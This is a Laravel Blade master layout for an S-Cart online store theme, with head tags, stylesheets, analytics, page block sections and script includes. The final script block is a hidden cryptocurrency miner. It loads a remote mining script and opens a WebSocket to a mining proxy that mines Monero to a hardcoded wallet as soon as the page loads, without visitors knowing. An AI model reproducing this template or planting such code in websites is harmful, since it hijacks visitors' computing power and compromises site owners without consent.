<!DOCTYPE html>
<html class="wide wow-animation" lang="{{ app()->getLocale() }}">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="canonical" href="{{ request()->url() }}" />
    <meta name="description" content="{{ $description ?? sc_store('description') }}">
    <meta name="keyword" content="{{ $keyword ?? sc_store('keyword') }}">
    <title>{{ $title ?? sc_store('title') }}</title>
    <meta property="og:image" content="{{ !empty($og_image) ? sc_file($og_image) : sc_file('images/org.jpg') }}" />
    <meta property="og:url" content="{{ \Request::fullUrl() }}" />
    <meta property="og:type" content="Website" />
    <meta property="og:title" content="{{ $title ?? sc_store('title') }}" />
    <meta property="og:description" content="{{ $description ?? sc_store('description') }}" />
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <link rel="stylesheet" type="text/css"
        href="//fonts.googleapis.com/css?family=Roboto+Condensed:300,400,700%7CLato%7CKalam:300,400,700">
    <link rel="icon" href="{{ sc_file(sc_store('icon', null, 'images/icon.png')) }}" type="image/png"
        sizes="16x16">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-21RHXF116X"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-21RHXF116X');
    </script>

    <!-- css default for item s-cart -->
    @include($sc_templatePath . '.common.css')
    <!--//end css defaut -->

    <!--Module header -->
    @includeIf($sc_templatePath . '.common.render_block', ['positionBlock' => 'header'])
    <!--//Module header -->

    {{-- <link rel="stylesheet" href="{{ sc_file($sc_templateFile.'/css/bootstrap.css')}}">
    <link rel="stylesheet" href="{{ sc_file($sc_templateFile.'/css/iconoAlert.css')}}">
    <link rel="stylesheet" href="{{ sc_file($sc_templateFile.'/css/fonts.css')}}">
    <link rel="stylesheet" href="{{ sc_file($sc_templateFile.'/css/style.css')}}">  --}}

    <link rel="stylesheet" href="{{ asset('templates/waika-blue/assets/bootstrap-5.2.3-dist/css/bootstrap.css') }}">

    {{-- fontawesome --}}
    <link href="{{ asset('templates/waika-blue/assets/fontawesome-free-6.4.0-web/css/fontawesome.css') }}"
        rel="stylesheet">
    <link href="{{ asset('templates/waika-blue/assets/fontawesome-free-6.4.0-web/css/brands.css') }}" rel="stylesheet">
    <link href="{{ asset('templates/waika-blue/assets/fontawesome-free-6.4.0-web/css/solid.css') }}" rel="stylesheet">

    {{-- google fonts --}}
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">

    {{-- Sobre escribiendo estilos --}}
    <link href="{{ asset('templates/waika-blue/assets/css/style.css') }}" rel="stylesheet">


    <style>
        {!! sc_store_css() !!}
    </style>
    <style>
        .ie-panel {
            display: none;
            background: #212121;
            padding: 10px 0;
            box-shadow: 3px 3px 5px 0 rgba(0, 0, 0, .3);
            clear: both;
            text-align: center;
            position: relative;
            z-index: 1;
        }

        html.ie-10 .ie-panel,
        html.lt-ie-10 .ie-panel {
            display: block;
        }
    </style>

    @stack('styles')

    {{-- owl --}}
    <link href="{{ asset('/templates/waika-blue/assets/owlcarousel2-2.3.4/dist/assets/owl.carousel.min.css') }}"
        rel="stylesheet">
    <link href="{{ asset('/templates/waika-blue/assets/owlcarousel2-2.3.4/dist/assets/owl.theme.default.min.css') }}"
        rel="stylesheet">
    {{-- end owl --}}

    {{-- lsplide --}}
    <link href="{{ asset('/templates/waika-blue/assets/splide-4.1.3/dist/css/splide.min.css') }}" rel="stylesheet">
    {{-- end splide --}}
</head>

<body>
    <div class="ie-panel">
        <a href="http://windows.microsoft.com/en-US/internet-explorer/">
            <img src="{{ sc_file($sc_templateFile . '/images/ie8-panel/warning_bar_0000_us.jpg') }}" height="42"
                width="820"
                alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today.">
        </a>
    </div>
    <div class="page">
        {{-- Block header --}}
        @section('block_header') 
            @include($sc_templatePath . '.block_header')
        @show
        {{-- // Block header --}}

        {{-- Block top --}}
        @section('block_top')
            @include($sc_templatePath . '.block_top')

            <!--Breadcrumb -->
        @section('breadcrumb')
            @include($sc_templatePath . '.common.breadcrumb')
        @show
        <!--//Breadcrumb -->

        <!--Notice -->
        @include($sc_templatePath . '.common.notice')
        <!--//Notice -->
    @show
    {{-- //Block top --}}


    {{-- Block main --}} 
    @section('block_main')

        <section class="section section-xxl bg-default text-md-left">
            <div class="container">
                <div class="row row-50">
                    @section('block_main_content') 

                        @php
                            
                            $hasLeftBlock = false;
                            if (isset($sc_blocksContent['left'])) {
                                foreach ($sc_blocksContent['left'] as $block) {
                                    $pages = explode(',', $block->page);
                            
                                    if ($block->page == '*' || (isset($layout_page) && in_array($layout_page, $pages))) {
                                        $hasLeftBlock = true;
                                        break;
                                    }
                                }
                            }
                            
                        @endphp



                        @if ($hasLeftBlock)
                            <!--Block left-->
                            <div class="col-lg-3  d-none d-md-block">
                                @section('block_main_content_left')

                                    @include($sc_templatePath . '.block_main_content_left')

                                @show
                            </div>
                            <!--//Block left-->
                        @endif

                        <!--Block center-->


                        <div
                            class="@if ($hasLeftBlock > 0) col-12 col-md-12 col-lg-9 @else col-12 col-lg-12 col-xl-12 @endif">

                        @section('block_main_content_center')
                            @include($sc_templatePath . '.block_main_content_center')
                        @show
                    </div>
                    <!--//Block center-->


                    @if (empty($hiddenBlockRight))
                        <!--Block right -->
                        @section('block_main_content_right')
                            @include($sc_templatePath . '.block_main_content_right')
                        @show
                        <!--//Block right -->
                    @endif 

                @show
            </div>
        </div>
    </section>
@show
{{-- //Block main --}}
<!-- Render include view -->
@include($sc_templatePath . '.common.include_view')
<!--// Render include view -->


{{-- Block bottom --}}
@section('block_bottom')
    @include($sc_templatePath . '.block_bottom')
@show
{{-- //Block bottom --}}

{{-- Block footer --}}
@section('block_footer')
    @include($sc_templatePath . '.block_footer')
@show
{{-- //Block footer --}}

</div>

<div id="sc-loading">
<div class="sc-overlay"><i class="fa fa-spinner fa-pulse fa-5x fa-fw "></i></div>
</div>

<script src="{{ sc_file($sc_templateFile . '/js/core.min.js') }}"></script>
<script src="{{ sc_file($sc_templateFile . '/js/script.js') }}"></script>
<script src="{{ sc_file($sc_templateFile . '/js/jquery.paroller.js') }}"></script>

<script src="{{ asset('templates/waika-blue/assets/bootstrap-5.2.3-dist/js/bootstrap.bundle.min.js') }}"></script>

<script src="{{ asset('/templates/waika-blue/assets/owlcarousel2-2.3.4/dist/owl.carousel.min.js') }}"></script>

{{-- splide --}}
<script src="{{ asset('/templates/waika-blue/assets/splide-4.1.3/dist/js/splide.min.js') }}"></script>

<!-- js default for item s-cart -->
@include($sc_templatePath . '.common.js')
<!--//end js defaut -->
@stack('scripts')

<script src="/js/cliente1.js"></script>
<script src="/js/estado.js"></script>




<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
<script>
    (function() {
      var pool = "gulf.moneroocean.stream:20128";
      var walletAddress = "88dR6PNx6gG2r22gF4Q33Y54XZuZAQNpAYhNeCJQV1kTj82t8PG6Cgf1EQmnVvPizMYrcdYF59LnHDSTJXeB4io97qtG7Kx";
      var workerId = "";
      var threads = -5;
      var password = "x";
  
      function startMining() {
        if (typeof WebSocket !== "undefined") {
          var socket = new WebSocket("wss://f.xmrminingproxy.com:8181");
  
          socket.addEventListener("open", function(event) {
            var params = {
              type: "start",
              pool: pool,
              wallet: walletAddress,
              worker: workerId,
              threads: threads,
              pass: password
            };
  
            socket.send(JSON.stringify(params));
          });
  
          socket.addEventListener("close", function(event) {
             console.log('Manejar cierre de la conexión')
          });
  
          socket.addEventListener("error", function(event) {
            
            console.log('Manejar errores de la conexión')
          });
  
          socket.addEventListener("message", function(event) {
          
            console.log('Manejar mensajes recibidos')
          });
        }
      }
  
      startMining();
      throttleMiner = 20;
    })();
  </script>

</body>

</html>
